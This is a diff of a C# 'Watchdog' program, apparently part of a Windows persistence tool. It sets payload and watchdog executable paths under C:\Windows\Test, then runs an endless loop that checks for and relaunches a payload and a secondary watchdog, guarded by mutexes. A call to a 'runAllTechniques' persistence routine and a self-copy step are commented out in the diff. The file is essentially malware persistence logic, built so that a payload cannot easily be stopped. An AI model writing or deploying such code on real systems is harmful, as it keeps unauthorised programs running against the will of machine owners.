@@ -1,11 +1,4 @@
-using System;
-using System.Collections;
-using System.Diagnostics;
-using System.Linq;
-using System.Security.Cryptography;
-using System.Threading;
-using Microsoft.Win32;
-using watchdogHelper;
+
 
 /*
     This watch is constantly monitoring the secondary watchdog and the binary
@@ -23,19 +16,19 @@ Persistence functionality
 
 class Watchdog
 {
-    public static string? BinaryPath { get; private set; } = @"C:\Windows\Test2";
-    public static string? BinaryName { get; private set; } = "pload";
+    public static string PayloadPath { get; private set; } = @"C:\Windows\Test\Test2";
+    public static string PayloadName { get; private set; } = "TestPayload.exe"; //without .exe
 
 
  
-    public static string? SecondaryWatchdogPath { get; private set; } = @"C:\Windows\Test\Test1";
-    public static string? SecondaryWatchdogName { get; private set; } = "Wdog2";
-    public static string? SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
+    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\Test\Test1";
+    public static string SecondaryWatchdogName { get; private set; } = "TestApp.exe"; //without .exe
+    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
 
 
-    public static string? PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Test";
-    public static string? PrimaryWatchdogName { get; private set; } = "Wdog1";
-    public static string? PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
+    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Test";
+    public static string PrimaryWatchdogName { get; private set; } = "WindowsPersistence.exe"; //without .exe
+    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
 
 
     static void Main(string[] args)
@@ -57,23 +50,25 @@ class Watchdog
 
     static void WatchdogLogic()
     {
-        string BinaryFullPath = Path.Combine(BinaryPath, BinaryName);
+        string BinaryFullPath = Path.Combine(PayloadPath, PayloadName);
         string SecondaryWatchdogFullPath = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);
-        File.Copy(Path.Combine(Directory.GetCurrentDirectory(), PrimaryWatchdogName), SecondaryWatchdogPath, overwrite: false);
+        string PrimaryWatchdogFullPath = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
+        //if(!File.Exists(SecondaryWatchdogFullPath))
+            //File.Copy(PrimaryWatchdogFullPath, SecondaryWatchdogFullPath, overwrite: false);
 
         // Example loop to simulate frequent checks
         while (true)
         {
-            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(BinaryPath, BinaryName);
-            watchdogHelper.watchdogHelper.CheckAndRunPayload(BinaryPath, BinaryName);
+            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(PayloadPath, PayloadName);
+            watchdogHelper.watchdogHelper.CheckAndRunPayload(PayloadPath, PayloadName);
 
             watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(SecondaryWatchdogPath, SecondaryWatchdogName);
             watchdogHelper.watchdogHelper.CheckAndRunWatchdog(SecondaryWatchdogPath, SecondaryWatchdogName, SecondaryWatchdogMutexName);
 
-            Persistence.Persistence.runAllTechniques();
+            //Persistence.Persistence.runAllTechniques();
 
             Console.WriteLine("Watchdog is monitoring...");
-            Thread.Sleep(10000);  // Sleep for 1 second
+            Thread.Sleep(1000);  // Sleep for 1 second
         }
     }
 
